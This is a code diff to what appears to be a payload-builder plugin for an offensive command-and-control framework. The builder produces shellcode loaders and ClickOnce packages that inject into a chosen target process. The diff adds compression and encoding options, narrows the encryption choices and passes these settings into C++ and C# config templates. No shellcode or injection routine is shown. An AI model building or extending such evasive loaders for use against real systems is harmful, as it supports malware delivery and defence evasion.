@@ -125,6 +125,22 @@ ENCODING_METHODS = {
     "NONE"    : ""
 }
 
+# Compression type mappings for config templates
+COMPRESSION_TYPE_MAP = {
+    "NONE" : 0,
+    "LZNT1": 1,
+    "RLE"  : 2,
+}
+
+# Encoding type mappings for config templates
+ENCODING_TYPE_MAP = {
+    "NONE"   : 0,
+    "BASE64" : 1,
+    "ASCII85": 2,
+    "ALPHA32": 3,
+    "WORDS256": 4,
+}
+
 #
 # Commented out to reduce confusion
 # uncomment the ones that you will use on your custom loader
@@ -495,9 +511,9 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
-                "AES128_CBC",
-                "AES256_CBC",
-                "AES256_ECB",
+                # "AES128_CBC",
+                # "AES256_CBC",
+                # "AES256_ECB",
                 # "CHACHA20",
                 # "SALSA20",
                 "RC4",
@@ -1260,6 +1276,7 @@ generated if none have been entered.""",
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encrypted_shellcode_path_sc))
+                    output += f"[DEBUG] Copied C shellcode to {encrypted_shellcode_path_sc}\n"
                 elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                     # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                     shutil.copy(src=str(obfuscated_shellcode_path),
@@ -1413,12 +1430,14 @@ generated if none have been entered.""",
                 config_template = environment.get_template("config.hpp")
                 # Escape backslashes for C++ wide string literal
                 target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
+                compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
+                encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                 config_data = {
                     "TARGET_PROCESS": target_process,
                     "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                    "COMPRESSION_TYPE": compression_type_value,
+                    "ENCODING_TYPE": encoding_type_value,
                     "ENCRYPTION_TYPE": encryption_type_value,
-                    "ENCRYPTION_KEY": encryption_key_bytes,
-                    "ENCRYPTION_IV": encryption_iv_bytes,
                 }
                 rendered_config = config_template.render(**config_data)
 
@@ -1505,9 +1524,13 @@ generated if none have been entered.""",
                         config_template = environment.get_template("config.hpp")
                         # Escape backslashes for C++ wide string literal
                         target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
+                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
+                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                         config_data = {
                             "TARGET_PROCESS": target_process,
                             "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                            "COMPRESSION_TYPE": compression_type_value,
+                            "ENCODING_TYPE": encoding_type_value,
                             "ENCRYPTION_TYPE": encryption_type_value,
                             "ENCRYPTION_KEY": encryption_key_bytes,
                             "ENCRYPTION_IV": encryption_iv_bytes,
@@ -1646,7 +1669,12 @@ generated if none have been entered.""",
                             output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"
 
                         injection_config_template = environment.get_template("InjectionConfig.cs")
+                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
+                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                         injection_config_data = {
+                            "COMPRESSION_TYPE": compression_type_value,
+                            "ENCODING_TYPE": encoding_type_value,
+                            "ENCRYPTION_TYPE": encryption_type_value,
                             "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                             "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                             "ENCRYPTION_KEY": encryption_key_bytes,
